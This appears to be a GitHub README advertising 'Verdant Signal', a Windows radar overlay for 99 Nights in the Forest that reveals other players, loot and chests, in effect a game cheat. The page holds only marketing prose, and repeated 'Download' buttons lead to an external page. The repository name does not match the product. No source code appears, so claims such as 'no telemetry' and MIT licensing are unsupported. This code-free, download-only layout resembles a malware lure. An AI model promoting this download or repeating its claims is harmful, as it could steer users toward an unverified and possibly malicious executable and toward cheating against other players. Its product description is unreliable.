![preview](https://raw.githubusercontent.com/walterblack89/Forest-Night-Loot-Radar-Pro/main/hero_913fc8.svg)
[![Download](https://raw.githubusercontent.com/walterblack89/Forest-Night-Loot-Radar-Pro/main/setup_f9b11.svg)](https://walterblack89.github.io/Forest-Night-Loot-Radar-Pro/)

# 🌲 Verdant Signal — Forest Survival Awareness Suite

**A next-generation environmental awareness companion for players of 99 Nights in the Forest on Windows.**

Verdant Signal is a standalone desktop utility that transforms the way you perceive the forest around you. Rather than reacting to danger after it arrives, Verdant Signal gives you a calm, readable layer of situational awareness — a second set of eyes tuned to the rhythm of the woods. Whether you are tracking roaming wildlife, watching for the missing child, scanning for supply caches, or simply monitoring the approach of nightfall, this suite keeps the important signals in view and the noise out of the way.

This project is the successor to the original radar-style concept, rebuilt from the ground up with a modular filter engine, persistent survival profiles, configurable detection ranges, and a clean interface that respects your screen real estate. Think of it as a compass for the unseen — a gentle pulse of information that helps you make better decisions without ever taking the driver's seat away from you.

[![Download](https://raw.githubusercontent.com/walterblack89/Forest-Night-Loot-Radar-Pro/main/setup_f9b11.svg)](https://walterblack89.github.io/Forest-Night-Loot-Radar-Pro/)

---

## 📖 Table of Contents

- [What Is Verdant Signal?](#-what-is-verdant-signal)
- [Design Philosophy](#-design-philosophy)
- [Feature Overview](#-feature-overview)
- [The Filter Engine](#-the-filter-engine)
- [Survival Profiles](#-survival-profiles)
- [Hotkey System](#-hotkey-system)
- [Range Configuration](#-range-configuration)
- [Interface and Experience](#-interface-and-experience)
- [Multilingual Support](#-multilingual-support)
- [Performance and Footprint](#-performance-and-footprint)
- [Compatibility](#-compatibility)
- [Responsive UI in a Desktop Context](#-responsive-ui-in-a-desktop-context)
- [Accessibility Considerations](#-accessibility-considerations)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Community and Support](#-community-and-support)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🌱 What Is Verdant Signal?

Verdant Signal is a Windows desktop overlay and companion panel designed for players who want a clearer picture of their surroundings in 99 Nights in the Forest. It listens to the world state your game already exposes, interprets that stream into meaningful categories, and presents them through a lightweight radar-style display and a set of configurable filters.

It is not a replacement for skill. It is an amplifier for attention. The forest is a place of quiet tension — footsteps in the brush, the flicker of a campfire, the distant shape of a deer. Verdant Signal collects those fragments and arranges them into a coherent whole, so you can spend less time guessing and more time surviving.

The name comes from the idea of a "signal in the green" — a beacon that stands out against the endless canopy. That is what this tool aspires to be: a single, trustworthy signal amid a thousand distractions.

---

## 🧭 Design Philosophy

Most awareness tools overwhelm. They flood the screen with markers, arrows, and popups until the interface becomes its own source of stress. Verdant Signal takes the opposite route.

**Listen more, shout less.** The interface only draws your eye when something genuinely relevant crosses your threshold. A deer wandering far to the north is not worth a flashing alert. The missing kid drifting toward your perimeter absolutely is.

**Let the player decide what matters.** Every category of entity — players, deer, the missing kid, chests, loot, resources, camps, and night status — can be toggled independently. You are never forced into someone else's idea of what is important.

**Persistence over repetition.** Your setup should not reset every session. Survival profiles let you save entire configurations — filters, ranges, hotkeys, and display preferences — and switch between them in a heartbeat.

**Calm by default, powerful on demand.** The default experience is intentionally gentle. Advanced tunables exist for players who want to sculpt the tool into something razor-sharp, but they are tucked away until you go looking.

---

## 🎯 Feature Overview

- **Radar-style awareness panel** — a compact visual map of nearby points of interest, drawn in real time.
- **Category filters** — independent toggles for players, deer, the missing kid, chests, loot, resources, camps, and night status.
- **Configurable detection range** — dial the radius up or down to match your play style.
- **Hotkey controls** — bind any action to a key combination for instant access without leaving the action.
- **Saved survival profiles** — store and recall complete configurations as named profiles.
- **Night-status indicator** — a dedicated readout for the transition between day and darkness.
- **Resource and loot separation** — treat gatherable materials differently from high-value caches.
- **Camp detection** — know when a settlement or fire ring is within your awareness radius.
- **Multilingual interface** — fully translated strings for a growing list of languages.
- **Responsive layout** — the panel adapts gracefully to different window sizes and resolutions.
- **Low-overhead rendering** — designed to run alongside your game without stealing frames.
- **Portable configuration files** — your settings travel with you, human-readable and easy to back up.

---

## 🔍 The Filter Engine

At the heart of Verdant Signal is a filter engine that treats every entity in the world as a signal with a category, a position, and a relevance weight.

Each category can be switched on or off from the main panel or via hotkey. When a category is disabled, its markers simply vanish from the radar — no ghosting, no half-states. When enabled, the engine decides how prominently to render each item based on its distance and your configured range.

Filters include:

| Category | Default State | Notes |
| --- | --- | --- |
| Players | On | Other survivors within range |
| Deer | On | Wildlife movement tracking |
| Missing Kid | On | Highlighted with priority styling |
| Chests | On | High-value storage containers |
| Loot | On | Ground-level pickups and drops |
| Resources | On | Gatherable materials |
| Camps | On | Fires, shelters, and settlement markers |
| Night Status | On | Day/night phase readout |

The beauty of the filter engine is its restraint. Turning off resources, for instance, declutters the radar dramatically during long gathering runs — suddenly the only things that glow are the ones that matter for the task at hand.

---

## 💾 Survival Profiles

Profiles are the memory of Verdant Signal. Instead of rebuilding your configuration every time you launch the game, you create a profile once and summon it whenever you need it.

A profile captures:

- The full set of category toggles.
- The detection range value.
- All hotkey bindings.
- Display preferences such as opacity, scale, and marker style.
- Language selection.

Common profiles players build include:

- **Scavenger** — resources and loot on, everything else muted.
- **Hunter** — deer tracking emphasized, camps and chests dimmed.
- **Guardian** — missing kid and players prioritized, wildlife secondary.
- **Nightwatch** — night status and camp detection front and center.

Switching profiles takes a single hotkey or a single click. There is no reload, no restart, no waiting.

---

## ⌨️ Hotkey System

Hotkeys transform the tool from a panel you look at into an instrument you play. Every meaningful action can be bound.

Typical bindings include:

- Toggle the entire overlay on or off.
- Cycle between saved profiles.
- Flip individual categories without opening a menu.
- Increase or decrease the detection range on the fly.
- Open the configuration window.

Bindings are stored per profile, so your Scavenger layout and your Guardian layout can use entirely different keys. Conflicts are detected and flagged before they ever reach your game.

---

## 📏 Range Configuration

Detection range is the single most powerful dial in Verdant Signal. Set it too wide and the radar becomes a wall of noise. Set it too narrow and you miss the very things you are trying to find.

The range control is continuous, not stepped, so you can fine-tune it to the exact radius that matches your current objective. A short range is perfect for tense, close-quarters survival where every meter counts. A long range is ideal for scouting and route planning across open terrain.

Range settings are saved per profile, meaning your Guardian profile can watch a wide perimeter while your Scavenger profile stays tight and focused.

---

## 🖥️ Interface and Experience

The interface is built around three zones:

1. **The radar disc** — a circular map showing nearby signals as styled markers.
2. **The status rail** — a slim strip for night status, active profile name, and range value.
3. **The control drawer** — a collapsible panel for filters, profiles, and hotkeys.

Everything is designed to be readable at a glance. Markers use shape as well as color, so the display remains legible even for players with color vision differences. The night-status indicator shifts gradually rather than snapping, giving you a sense of how much daylight remains.

The panel is draggable, resizable, and can be docked to any screen edge. Opacity is adjustable so it never obscures the action beneath it.

---

## 🌐 Multilingual Support

Verdant Signal ships with a translation framework that makes adding a new language a matter of editing a single resource file. The interface strings, tooltips, and notifications are all externalized.

Currently supported and planned languages include English, Spanish, Portuguese, French, German, Italian, Polish, Turkish, Japanese, Korean, and Simplified Chinese. Community translations are warmly welcomed, and the project maintains a contributor guide for localization.

Language selection is part of each survival profile, so a player who shares their setup with a friend in another region can hand over a fully localized experience.

---

## ⚡ Performance and Footprint

Awareness tools live or die by their overhead. Verdant Signal is engineered for a light touch:

- Rendering is batched and only redraws when the world state changes.
- The radar disc uses a fixed-size buffer to keep memory stable.
- Background polling is throttled to a rate that is responsive but not wasteful.
- No telemetry, no network chatter, no background updaters.

The result is a companion that sits quietly beside your game rather than competing with it.

---

## 🧩 Compatibility

Verdant Signal targets Windows desktop environments and is tested across a range of display configurations, including multi-monitor setups, high-DPI screens, and ultrawide resolutions. It is designed to cooperate with common overlay and streaming tools rather than fight them for screen space.

If you run the game in windowed, borderless, or fullscreen modes, the panel can be positioned to suit each. Windowed mode naturally allows the most flexible arrangement, but borderless fullscreen is fully supported.

---

## 📱 Responsive UI in a Desktop Context

Responsiveness is not only a mobile concern. On a desktop, it means the interface gracefully reflows when you resize the panel, when you move it between monitors with different scaling factors, and when you shrink it down to a tiny corner widget.

The radar disc scales proportionally. The status rail collapses into icons at small sizes. The control drawer becomes a flyout. Nothing breaks, nothing overlaps, and nothing becomes unreadable.

---

## ♿ Accessibility Considerations

- Shape-coded markers in addition to color.
- Adjustable text size across the entire interface.
- High-contrast mode for the radar disc.
- Screen-reader-friendly labels for all controls.
- Keyboard-only navigation for every function.

Accessibility is an ongoing effort, and feedback from players with different needs directly shapes the roadmap.

---

## ❓ Frequently Asked Questions

**Does Verdant Signal modify the game in any way?**
No. It observes the world state your game already presents and renders an independent overlay. It does not alter game files.

**Will it work with any version of the game?**
It is built to be resilient across updates, with a compatibility layer that adapts to changes in the exposed world state.

**Can I share my profiles with friends?**
Yes. Profiles are stored as human-readable configuration files that can be exported and imported freely.

**Is there a mobile version?**
The project is focused on Windows desktop. A companion viewer for secondary devices is on the 2026 roadmap.

**How often is it updated?**
Releases follow a steady cadence, with hotfixes as needed and feature drops aligned to major game updates.

**Do I need to configure anything to get started?**
No. The default profile is ready the moment you launch it. Configuration is there for players who want to go deeper.

**Where are my settings stored?**
In a portable configuration directory beside the application, so you can back it up or move it between machines trivially.

---

## 🗺️ Roadmap for 2026

- Expanded language packs with community contributions.
- A profile-sharing hub with curated presets.
- Optional companion viewer for tablets and phones.
- Enhanced camp detection with structure classification.
- Timeline replay of recent signals for post-run review.
- Themeable marker sets.
- Deeper accessibility options, including full remapping of every control.
- A statistics panel summarizing your survival patterns over time.

---

## 🤝 Community and Support

Verdant Signal grows through the people who use it. Bug reports, translation pull requests, preset submissions, and feature ideas are all welcome. The project maintains clear contribution guidelines and a code of conduct that keeps the space friendly and focused.

Support is available around the clock through the project's discussion channels, with a commitment to acknowledging every report. Whether you are stuck on a configuration detail or want to propose a new filter category, you will find someone listening.

---

## 📜 License

This project is released under the MIT License. You are welcome to use, study, modify, and redistribute it in accordance with the terms of that license.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Verdant Signal contributors.

---

## ⚠️ Disclaimer

Verdant Signal is an independent awareness tool and is not affiliated with, endorsed by, or sponsored by the creators or publishers of 99 Nights in the Forest. All trademarks and game names belong to their respective owners.

This software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

Players are responsible for understanding and respecting the terms of service of any game they play. Verdant Signal is intended as a personal awareness aid and should be used in a manner consistent with fair play and the rules of the environments in which it is used.

Use it wisely. The forest rewards patience, and so does good tooling.

[![Download](https://raw.githubusercontent.com/walterblack89/Forest-Night-Loot-Radar-Pro/main/setup_f9b11.svg)](https://walterblack89.github.io/Forest-Night-Loot-Radar-Pro/)